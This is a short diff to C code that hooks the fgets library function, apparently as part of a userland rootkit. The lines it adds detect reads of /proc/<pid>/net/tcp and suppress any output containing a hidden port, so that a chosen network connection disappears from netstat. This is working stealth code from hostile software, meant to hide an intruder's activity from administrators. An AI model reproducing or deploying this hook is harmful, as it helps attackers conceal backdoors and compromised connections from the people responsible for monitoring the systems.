@@ -465,6 +465,20 @@ char *fgets(char *s, int size, FILE *stream)
         }
     }
 
+    // Used by netstat for reading connections
+    // -> /proc/net/tcp
+    int pid;
+    if (sscanf(path, "/proc/%d/net/tcp", &pid) == 1)
+    {
+        // port to hide, we skip it
+        char hex_port[10];
+        sprintf(hex_port, "%X", port_to_hide);
+
+        if (strstr(s, hex_port) != NULL)
+        {
+            return NULL;
+        }
+    }
     return ret;
 }
 
